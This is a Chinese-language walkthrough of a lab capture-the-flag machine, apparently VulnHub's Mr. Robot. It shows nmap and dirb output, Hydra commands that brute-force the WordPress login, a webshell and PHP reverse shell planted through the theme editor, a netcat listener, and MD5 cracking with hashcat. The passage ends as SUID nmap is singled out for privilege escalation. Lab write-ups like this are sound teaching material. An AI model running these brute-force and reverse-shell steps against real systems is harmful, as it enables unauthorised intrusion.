<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 80,443,22 -sV -Pn -T5 -A --script=vuln 192.168.56.107</span></span><br><span class="line">PORT    STATE  SERVICE  VERSION</span><br><span class="line">22/tcp  closed ssh</span><br><span class="line">80/tcp  open   http     Apache httpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni(<span class="string">&quot;Email</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: http://192.168.56.107/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.107:80/js/BASE_URL+%22/live/%22);this.firstBoot?(this.firstBoot=!1,this.track.omni(&quot;</span>Email</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: http://192.168.56.107/</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.107:80/wp-login.php</span><br><span class="line">|     Form id: loginform</span><br><span class="line">|_    Form action: http://192.168.56.107/wp-login.php</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin/: Possible admin folder</span></span><br><span class="line"><span class="string">|   /admin/index.html: Possible admin folder</span></span><br><span class="line"><span class="string">|   /wp-login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /robots.txt: Robots file</span></span><br><span class="line"><span class="string">|   /feed/: Wordpress version: 4.3.1</span></span><br><span class="line"><span class="string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span></span><br><span class="line"><span class="string">|   /wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /wp-admin/upgrade.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /readme.html: Interesting, a readme.</span></span><br><span class="line"><span class="string">|   /0/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /image/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">443/tcp open   ssl/http Apache httpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.107</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/vendor/null,this.tags.length=0%7d,t.get=<span class="keyword">function</span>()%7bif(0==this.tags.length)<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/u;c.appendChild(o);<span class="string">&#x27;+(n?&#x27;</span>o.c=0;o.i=setTimeout(f2,100)<span class="string">&#x27;:&#x27;</span><span class="string">&#x27;)+&#x27;</span>&#125;&#125;catch(e)&#123;o=0&#125;<span class="built_in">return</span></span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: https://192.168.56.107:443/</span><br><span class="line">|     </span><br><span class="line">|     Path: https://192.168.56.107:443/js/rs;<span class="keyword">if</span>(s.useForcedLinkTracking||s.bcf)&#123;<span class="keyword">if</span>(!s.<span class="string">&quot;</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://192.168.56.107:443/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: https://192.168.56.107:443/js/rs;if(s.useForcedLinkTracking||s.bcf)&#123;if(!s.&quot;</span></span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: https://192.168.56.107:443/</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /admin/: Possible admin folder</span></span><br><span class="line"><span class="string">|   /admin/index.html: Possible admin folder</span></span><br><span class="line"><span class="string">|   /wp-login.php: Possible admin folder</span></span><br><span class="line"><span class="string">|   /robots.txt: Robots file</span></span><br><span class="line"><span class="string">|   /feed/: Wordpress version: 4.3.1</span></span><br><span class="line"><span class="string">|   /wp-includes/images/rss.png: Wordpress version 2.2 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.</span></span><br><span class="line"><span class="string">|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.</span></span><br><span class="line"><span class="string">|   /wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /wp-admin/upgrade.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /readme.html: Interesting, a readme.</span></span><br><span class="line"><span class="string">|   /0/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /image/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-server-header: Apache</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_sslv2-drown:</span><br></pre></td></tr></table></figure>

<p>dirb扫一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.107/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Jan  2 20:43:02 2020</span><br><span class="line">URL_BASE: http://192.168.56.107/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.107/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/0/                                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/admin/                                                           </span><br><span class="line">+ http://192.168.56.107/atom (CODE:301|SIZE:0)                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/audio/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/blog/                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/css/                                                             </span><br><span class="line">+ http://192.168.56.107/dashboard (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/favicon.ico (CODE:200|SIZE:0)                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/feed/                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/image/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/Image/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/images/                                                          </span><br><span class="line">+ http://192.168.56.107/index.html (CODE:200|SIZE:1188)                                               </span><br><span class="line">+ http://192.168.56.107/index.php (CODE:301|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/intro (CODE:200|SIZE:516314)                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/js/                                                              </span><br><span class="line">+ http://192.168.56.107/license (CODE:200|SIZE:309)                                                   </span><br><span class="line">+ http://192.168.56.107/login (CODE:302|SIZE:0)                                                       </span><br><span class="line">+ http://192.168.56.107/page1 (CODE:301|SIZE:0)                                                       </span><br><span class="line">+ http://192.168.56.107/phpmyadmin (CODE:403|SIZE:94)                                                 </span><br><span class="line">+ http://192.168.56.107/rdf (CODE:301|SIZE:0)                                                         </span><br><span class="line">+ http://192.168.56.107/readme (CODE:200|SIZE:64)                                                     </span><br><span class="line">+ http://192.168.56.107/robots (CODE:200|SIZE:41)                                                     </span><br><span class="line">+ http://192.168.56.107/robots.txt (CODE:200|SIZE:41)                                                 </span><br><span class="line">+ http://192.168.56.107/rss (CODE:301|SIZE:0)                                                         </span><br><span class="line">+ http://192.168.56.107/rss2 (CODE:301|SIZE:0)                                                        </span><br><span class="line">+ http://192.168.56.107/sitemap (CODE:200|SIZE:0)                                                     </span><br><span class="line">+ http://192.168.56.107/sitemap.xml (CODE:200|SIZE:0)                                                 </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/video/                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-admin/                                                        </span><br><span class="line">+ http://192.168.56.107/wp-config (CODE:200|SIZE:0)                                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-content/                                                      </span><br><span class="line">+ http://192.168.56.107/wp-cron (CODE:200|SIZE:0)                                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.107/wp-includes/                                                     </span><br><span class="line">+ http://192.168.56.107/wp-links-opml (CODE:200|SIZE:227)                                             </span><br><span class="line">+ http://192.168.56.107/wp-load (CODE:200|SIZE:0)                                                     </span><br><span class="line">+ http://192.168.56.107/wp-login (CODE:200|SIZE:2678)                                                 </span><br><span class="line">+ http://192.168.56.107/wp-mail (CODE:500|SIZE:3064)                                                  </span><br><span class="line">+ http://192.168.56.107/wp-settings (CODE:500|SIZE:0)                                                 </span><br><span class="line">+ http://192.168.56.107/wp-signup (CODE:302|SIZE:0)                                                   </span><br><span class="line">+ http://192.168.56.107/xmlrpc (CODE:405|SIZE:42)                                                     </span><br><span class="line">+ http://192.168.56.107/xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure>
<p>可以看到是wordpress的cms</p>
<p>看一看robots.txt<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA3L3JvYm90cy50eHQ=">http://192.168.56.107/robots.txt<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>

<p>此时第一个key已经有了<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA3L2tleS0xLW9mLTMudHh0">http://192.168.56.107/key-1-of-3.txt<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>

<p>然后将fsocity.dic下载下来分析</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget http://192.168.56.107/fsocity.dic</span></span><br><span class="line">--2020-01-02 20:53:02--  http://192.168.56.107/fsocity.dic</span><br><span class="line">正在连接 192.168.56.107:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：7245381 (6.9M) [text/x-c]</span><br><span class="line">正在保存至: “fsocity.dic”</span><br><span class="line"></span><br><span class="line">fsocity.dic               100%[====================================&gt;]   6.91M  26.5MB/s  用时 0.3s    </span><br><span class="line"></span><br><span class="line">2020-01-02 20:53:02 (26.5 MB/s) - 已保存 “fsocity.dic” [7245381/7245381])</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># file fsocity.dic </span></span><br><span class="line">fsocity.dic: , name offset 0x620a7574</span><br><span class="line">root@kali:~<span class="comment"># wc -l fsocity.dic </span></span><br><span class="line">858160 fsocity.dic</span><br><span class="line">root@kali:~<span class="comment"># head fsocity.dic </span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">wikia</span><br><span class="line">from</span><br><span class="line">the</span><br><span class="line">now</span><br><span class="line">Wikia</span><br><span class="line">extensions</span><br><span class="line">scss</span><br><span class="line">window</span><br></pre></td></tr></table></figure>

<p>这看起来像一个自定义单词列表，其中包含800k +个单词。但是，似乎有很多重复了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sort fsocity.dic | uniq | wc -l</span></span><br><span class="line">11451</span><br></pre></td></tr></table></figure>

<p>将fsocity.dic去重</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sort fsocity.dic | uniq &gt; fsocityrm.dic</span></span><br><span class="line">root@kali:~<span class="comment"># wc -l fsocityrm.dic</span></span><br><span class="line">11451 fsocityrm.dic</span><br></pre></td></tr></table></figure>

<p>可以看到去重之后的字典只有11451条了，显然在这里安装了wordpress。 如果浏览到/readme.html，可以看到使用的WordPress版本为4.3.9。要做的下一件事是在计算机上运行WpScan。 它揭示了几个过时的模块，但没有设法利用。<br>因此，决定专注于管理面板，并尝试强行爆破管理员账号密码。 第一步是找到有效的用户名。 不幸的是，该网站似乎没有任何帖子，因此没有作者信息出现。 WpScan也无法枚举用户。<br>幸运的是，有一个非常方便的工具叫做Hydra，它可以暴力破解几乎所有东西，包括HTTP格式的用户名。 这是尝试登录/wp-login.php时发出的POST请求</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /wp-login.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.107</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 101</span><br><span class="line">Origin: http://192.168.56.107</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.107/wp-login.php?redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&amp;reauth=1</span><br><span class="line">Cookie: s_fid=6F117A4BEDFCBCE8-0646B35B635BEF6C; s_nr=1577958190705; s_cc=<span class="literal">true</span>; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>=user&amp;<span class="built_in">pwd</span>=pass&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&amp;testcookie=1</span><br></pre></td></tr></table></figure>

<p>使用hydra爆破，第一步，尝试找到用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -L fsocityrm.dic -p wedontcare 192.168.56.107 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username&quot;</span></span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: elliot   password: wedontcare</span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: Elliot   password: wedontcare</span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: ELLIOT   password: wedontcare</span><br></pre></td></tr></table></figure>
<ul>
<li>得到用户名是elliot，不区分大小写。</li>
</ul>
<p><font color="red">分解下各个参数的含义</font></p>
<ul>
<li>-vV : 输出详情</li>
<li>-L fsocityrm.dic : 尝试fsocityrm.dic中的所有用户名</li>
<li>-p wedontcare : 使用唯一的密码没关系（我们现在只对用户名感兴趣）</li>
<li>192.168.56.107 : wordpress的ip地址</li>
<li>http-post-form : 要尝试的暴力手段，这里是HTTP POST表单</li>
<li>‘/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username’<br>/wp-login.php : 表单所在的路径<br>log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In : 要发送的POST参数。^USER^和^PASS^是占位符，将被替换为实际值。<br>F=Invalid username : 如果响应包含文本无效的用户名，则将尝试视为失败（F）</li>
</ul>
<p>得到用户名之后用hydra爆破密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l elliot -P fsocityrm.dic 192.168.56.107 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect.&quot; -t 64</span></span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: elliot   password: ER28-0652</span><br></pre></td></tr></table></figure>

<ul>
<li>得到密码：ER28-0652</li>
</ul>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub126.jpg"></p>
<p>将图片中的内容替换成冰蝎马，然后连接</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub127.jpg"></p>
<p>上传php-reverse-shell，然后kali端监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.107/wp-content/themes/twentyfifteen/phpreverseshell.php</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.107: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.107] 52294</span><br><span class="line">Linux linux 3.13.0-55-generic <span class="comment">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 11:43:48 up  2:18,  0 users,  load average: 0.00, 0.15, 0.42</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">daemon</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<p>成功弹回shell</p>
<p>找到第二个key，但是权限不足</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">robot</span><br><span class="line">$ <span class="built_in">cd</span> robot</span><br><span class="line"><span class="built_in">cd</span> robot</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">key-2-of-3.txt  password.raw-md5</span><br><span class="line">$ cat key-2-of-3.txt</span><br><span class="line">cat key-2-of-3.txt</span><br><span class="line">cat: key-2-of-3.txt: Permission denied</span><br></pre></td></tr></table></figure>

<p>接着看看password.raw-md5有什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat password.raw-md5</span><br><span class="line">cat password.raw-md5</span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure>

<p>显然，它看起来像是未加盐的MD5哈希密码，使用HashCat进行破解应该很容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./hashcat64.exe -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">* Device <span class="comment">#3: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#1: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#2: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#3: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 1 sec</span><br><span class="line"></span><br><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: MD5</span><br><span class="line">Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b</span><br><span class="line">Time.Started.....: Fri Jan 03 11:57:09 2020 (0 secs)</span><br><span class="line">Time.Estimated...: Fri Jan 03 11:57:09 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#3.........: 54880.6 kH/s (2.68ms) @ Accel:1024 Loops:1 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 1048576/14344385 (7.31%)</span><br><span class="line">Rejected.........: 0/1048576 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; Leslee</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Fri Jan 03 11:57:03 2020</span><br><span class="line">Stopped: Fri Jan 03 11:57:11 2020</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub128.jpg"></p>
<p>由于电脑的GPU配置超屌，所以密码一秒钟就出来了，是abcdefghijklmnopqrstuvwxyz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>

<p>直接登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ su robot</span><br><span class="line">su robot</span><br><span class="line">Password: abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">robot@linux:~$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(robot) gid=1002(robot) groups=1002(robot)</span><br><span class="line">robot@linux:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">robot</span><br></pre></td></tr></table></figure>

<p>读取第二个key，帅呆了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:~$ ls</span><br><span class="line">ls</span><br><span class="line">key-2-of-3.txt  password.raw-md5</span><br><span class="line">robot@linux:~$ cat key-2-of-3.txt</span><br><span class="line">cat key-2-of-3.txt</span><br><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在MySQL数据库中没什么有趣的。 还有一个名为mich05654的WordPress用户，其密码为Dylan_2791，但似乎毫无用处。<br>经过一段时间的系统探索，发现了一个有趣的二进制文件，其SUID为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>

<p>是的，是NMap本身！ 确切地说，它是旧版本（3.81）。 有趣的是，可执行文件由root拥有。 由于其SUID位置1，因此如果设法让nmap运行命令，则nmap理论上可以以root用户身份执行命令。<br>看一下nmap –help的输出，可以告诉我们nmap具有–interactive选项，可以产生某种REPL。</p>
